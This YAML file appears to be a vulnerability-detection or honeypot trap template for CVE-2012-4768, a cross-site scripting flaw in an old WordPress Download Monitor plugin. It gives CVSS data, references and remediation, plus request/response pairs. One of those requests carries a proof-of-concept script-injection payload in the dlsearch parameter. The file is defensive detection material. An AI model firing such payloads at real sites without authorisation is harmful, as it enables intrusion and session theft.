id: CVE-2012-4768
info:
  name: WordPress Plugin Download Monitor < 3.3.5.9 - Cross-Site Scripting
  author: daffainfo
  description: A cross-site scripting vulnerability in the Download Monitor plugin
    before 3.3.5.9 for WordPress allows remote attackers to inject arbitrary web script
    or HTML via the dlsearch parameter to the default URI.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Update to the latest version of Download Monitor (3.3.5.9 or higher)
    or apply the official patch provided by the plugin developer.

    '
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2012-4768
  - http://packetstormsecurity.org/files/116408/wpdownloadmonitor3357-xss.txt
  - http://www.reactionpenetrationtesting.co.uk/wordpress-download-monitor-xss.html
  - https://exchange.xforce.ibmcloud.com/vulnerabilities/78422
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cve-id: CVE-2012-4768
    cwe-id: CWE-79
    epss-score: 0.00922
    epss-percentile: 0.82559
    cpe: cpe:2.3:a:mikejolley:download_monitor:3.3.5.7:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: mikejolley
    product: download_monitor
    framework: wordpress
  tags: cve,cve2012,xss,wp-plugin,packetstorm,wordpress,mikejolley
traps:
- request:
    method: GET
    path: /wp-content/plugins/download-monitor/readme.txt
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: Download Monitor =
- request:
    method: GET
    path: /?dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: </script><script>alert(document.domain)</script>
